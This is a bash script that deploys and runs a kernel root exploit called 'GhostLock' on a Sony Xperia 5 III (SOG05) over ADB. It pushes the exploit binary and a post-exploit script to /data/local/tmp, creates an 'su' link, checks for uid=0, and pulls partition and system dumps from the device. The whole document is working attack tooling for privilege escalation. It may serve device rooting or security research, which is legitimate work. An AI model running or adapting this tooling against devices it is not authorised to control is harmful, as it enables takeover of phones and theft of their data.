#!/usr/bin/env bash
# deploy_sog05.sh - One-click deployment & test runner for Sony Xperia 5 III (SOG05)
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
BIN_DIR="$SCRIPT_DIR/bin"

if [ -f "$REPO_ROOT/sog05-5.4.210/bin/exploit_static" ]; then
    EXPLOIT_BIN="$REPO_ROOT/sog05-5.4.210/bin/exploit_static"
else
    EXPLOIT_BIN="$REPO_ROOT/exploit/build/sog05-5.4.210/bin/exploit_static"
fi

echo "=================================================="
echo " GhostLock 5.4 Xperia (SOG05) Auto-Deploy & Root "
echo "=================================================="

# 1. Check ADB connection
echo "[1/6] Checking ADB device connection..."
if ! command -v adb >/dev/null 2>&1; then
    echo "[-] Error: 'adb' command not found in PATH."
    exit 1
fi

DEVICE_STATUS=$(adb get-state 2>/dev/null || true)
if [ "$DEVICE_STATUS" != "device" ]; then
    echo "[-] Error: No authorized ADB device found. Please enable USB debugging."
    adb devices
    exit 1
fi
echo "[+] Device connected: $(adb shell getprop ro.product.model 2>/dev/null || echo 'Android Device')"

# 2. Check for exploit binary
echo "[2/6] Checking exploit binary..."
if [ ! -f "$EXPLOIT_BIN" ]; then
    echo "[-] Exploit binary not found at $EXPLOIT_BIN"
    echo "[*] Attempting local build with make..."
    if [ -n "$ANDROID_NDK_ROOT" ] || [ -n "$NDK_ROOT" ]; then
        make -C "$REPO_ROOT/exploit" PROJECT=sog05-5.4.210 -j4 bin
    else
        echo "[-] Please build the binary first or set NDK_ROOT."
        echo "    Example: make -C exploit PROJECT=sog05-5.4.210 NDK_ROOT=/path/to/ndk bin"
        exit 1
    fi
fi

# 3. Push payload to device
echo "[3/5] Pushing payload to /data/local/tmp..."
adb push "$EXPLOIT_BIN" /data/local/tmp/gl
adb push "$SCRIPT_DIR/post_exploit.sh" /data/local/tmp/post_exploit.sh

adb shell "chmod 755 /data/local/tmp/gl /data/local/tmp/post_exploit.sh && ln -sf /data/local/tmp/gl /data/local/tmp/su"

# 4. Run the exploit
echo "[4/5] Triggering GhostLock kernel exploit..."
echo "[*] Running /data/local/tmp/gl (device may take a few moments)..."
adb shell "/data/local/tmp/gl"

# Give post-exploit hook a couple of seconds to finish
sleep 2

# 5. Check results and pull dump
echo "[5/5] Verifying root status..."
if adb shell "/data/local/tmp/su -c id" 2>/dev/null | grep -q "uid=0"; then
    echo "[SUCCESS] Root access confirmed via /data/local/tmp/su!"
    
    # Display post-exploit log
    echo "--- Post-Exploit Log ---"
    adb shell "cat /data/local/tmp/post_exploit.log 2>/dev/null" || true
    echo "------------------------"

    # Pull system dumps if created
    OUTPUT_DUMP="$REPO_ROOT/dumps_$(date +%Y%m%d_%H%M%S)"
    echo "[*] Pulling partition and system dumps to $OUTPUT_DUMP..."
    adb pull /data/local/tmp/xperia_dump "$OUTPUT_DUMP" 2>/dev/null || true
    echo "[+] Done! Full root active until next reboot."
else
    echo "[-] Exploit run did not yield uid=0. If device rebooted, run again."
fi

